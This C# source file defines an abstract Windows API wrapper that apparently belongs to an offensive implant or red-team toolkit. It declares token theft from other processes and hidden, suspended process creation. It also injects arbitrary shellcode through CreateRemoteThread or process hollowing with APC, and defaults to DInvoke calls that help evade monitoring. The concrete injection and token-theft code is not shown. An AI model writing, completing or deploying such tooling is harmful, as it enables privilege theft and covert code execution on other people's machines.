using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace WinAPI.Wrapper
{
    public struct ProcessCreationParameters
    {
        public string Application { get; set; }
        public string Command { get; set; }
        public IntPtr Token { get; set; }
        public bool RedirectOutput { get; set; }
        public bool CreateSuspended { get; set; }
        public bool CreateNoWindow { get; set; }
        public string CurrentDirectory { get; set; }
    }

    public struct ProcessCreationResult
    {
        public int ProcessId { get; set; }
        public IntPtr ProcessHandle { get; set; }
        public IntPtr ThreadHandle { get; set; }
        public IntPtr OutPipeHandle { get; set; }
    }

    public enum APIAccessType
    {
        PInvoke,
        DInvoke
    }

    public enum InjectionMethod
    {
        CreateRemoteThread,
        ProcessHollowingWithAPC
    }


    public abstract class WinAPIWrapper
    {
        public abstract IntPtr StealToken(int processId);

        public abstract ProcessCreationResult CreateProcess(ProcessCreationParameters parms);

        public abstract byte[] ReadFromPipe(IntPtr pipe, uint buffSize = 1024);

        public string ReadPipeToEnd(int processId, IntPtr pipeHandle, Action<string> callback = null, uint buffSize = 1024)
        {
            string output = string.Empty;
            string chunck = string.Empty;
            var process = System.Diagnostics.Process.GetProcessById(processId);
            if (process == null)
                return output;


            byte[] b = null;
            while (!process.HasExited)
            {
                b = this.ReadFromPipe(pipeHandle, buffSize);
                if (b != null)
                {
                    chunck = Encoding.UTF8.GetString(b);
                    output += chunck;
                    callback?.Invoke(chunck);
                }
                Thread.Sleep(100);
            }
            b = this.ReadFromPipe(pipeHandle, buffSize);
            if (b != null)
            {
                chunck = Encoding.UTF8.GetString(b);
                output += chunck;
                callback?.Invoke(chunck);
            }

            return output;
        }

        public static WinAPIWrapper CreateInstance(APIAccessType accessType = APIAccessType.DInvoke)
        {
            if (accessType == APIAccessType.DInvoke)
                return new DInvokeAPIWrapper();

            return new PInvokeAPIWrapper();
        }

        public void Inject(IntPtr processHandle, IntPtr threadHandle, byte[] shellcode, InjectionMethod? method = InjectionMethod.ProcessHollowingWithAPC)
        {
            switch(method)
            {
                case InjectionMethod.CreateRemoteThread:
                    this.InjectCreateRemoteThread(processHandle, threadHandle, shellcode);
                    return;
                case InjectionMethod.ProcessHollowingWithAPC:
                    this.InjectProcessHollowingWithAPC(processHandle, threadHandle, shellcode);
                    return;
            }
        }

        public abstract void InjectCreateRemoteThread(IntPtr processHandle, IntPtr threadHandle, byte[] shellcode);

        public abstract void InjectProcessHollowingWithAPC(IntPtr processHandle, IntPtr threadHandle, byte[] shellcode);
    }
}
